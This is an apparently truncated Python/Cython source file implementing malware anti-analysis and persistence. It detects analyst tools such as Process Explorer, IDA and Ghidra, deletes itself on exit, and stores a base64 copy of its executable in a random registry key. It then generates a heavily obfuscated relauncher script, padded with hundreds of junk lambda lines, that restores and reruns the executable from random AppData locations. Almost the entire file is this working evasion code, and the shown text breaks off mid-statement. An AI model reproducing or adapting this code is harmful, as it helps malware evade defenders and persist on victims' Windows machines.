import os
import time
import psutil
from base64 import b64encode
from codecs import encode
from zlib import compress
from random import choice,randrange
import signal,atexit
from marshal import loads,dumps
from os import urandom
from Utils.helpers import get_current_file_path,run_detached_process,\
    find_python_path,random_string,base64_encode_file,setRegistryKey,TypicalRegistryKey
cdef list debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
hide = 0
cpdef bint find_debug_process():
    """we return true if we found any debug process exists, else false"""
    for debug_proc in debug_process:
        for process in psutil.process_iter():
            if debug_proc in process.name().lower():
                return True
    return False


def remove_on_exit():
    os.remove(get_current_file_path())
    print('removing')
    raise SystemExit()

def process_monitor():
    """
    we didn't cpde'ed this because closures aren't supported in cython
    really simple, this function run as thread in the background.
    if we find any debug process, we are doing the next steps:
    1. we create random key in the registry with value being our base64 code of the current exe(persistence)
    2. we create plain python code with specific injected values to run from the cli
    3. this code will silently monitor until condition's are met
    4. when the condition's are met, the cli code will load the base64 from the registry
       it will base64 decode it, create a exe in random location with random name, and launch it
       the exe that got launched is PURE copy of our own code, so it will also avoid debug in the same way.
      """
    python_path = find_python_path()
    if 'program' in python_path.lower() and 'appdata' not in python_path.lower():
        python_path = f'"{python_path}"'
    random_locations = [f"c:/users/{os.getlogin()}/appdata/local/temp/",
                        f"c:/users/{os.getlogin()}/appdata/local/programs/",
                        f"c:/users/{os.getlogin()}/appdata/LocalLow/",
                       f"c:/users/{os.getlogin()}/appdata/Roaming/"]
    if python_path:
        print(f'{python_path} -m pip install psutil')
        install_psutil = run_detached_process(f'{python_path} -m pip install psutil')
    while True:
        time.sleep(5)
        if any(debug_proc in process.name().lower() or process.name().lower() in debug_proc for debug_proc in debug_process for process in psutil.process_iter()):
            print('debug process handler')
            if not find_python_path():
                os.kill(os.getpid(), signal.SIGTERM)
                return True

            current_file = get_current_file_path()
            our_pid = os.getpid()
            random_location = os.path.join(choice(random_locations), random_string(is_random=True,is_exe=True))
            our_source = base64_encode_file(current_file)
            our_reg_key = random_string(is_random=True)
            setRegistryKey(registry_path=TypicalRegistryKey,key_name=our_reg_key,value=our_source)
            print('random here',current_file,random_location)
            our_code = b64encode(f"""
import psutil
import os
import time
import signal
from base64 import b64decode
import winreg
from ctypes import windll
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
mnipwengipwnipgwe = winreg
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
cqmqwingqwipnipgqw = mnipwengipwnipgwe.HKEY_CURRENT_USER
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
cnqwnipcqwipnwrf = cqmqwingqwipnipgqw
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
nipqnpcq = 0x000000000
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
npicipqnipniptewtw = mnipwengipwnipgwe.KEY_READ
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
nmopvmqpomwovqotgqw = npicipqnipniptewtw
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
mvopqipnwnipgnipqwgqw = mnipwengipwnipgwe.OpenKey
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
cqwpinipgnipqwgqw = mvopqipnwnipgnipqwgqw
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
cqwobuoboqpiogrteuer = mnipwengipwnipgwe.QueryValueEx
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
zbznpibipewnipbnweipnipegwtywe = cqwobuoboqpiogrteuer
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
obuqwuofbuoqwbfouqwbuofbuoqwbuofqw = mnipwengipwnipgwe.CloseKey
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
nippinnipgnipqwiptipqipwtipqwt = obuqwuofbuoqwbfouqwbuofbuoqwbuofqw
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def magic_p(b, c):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    return c - b
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
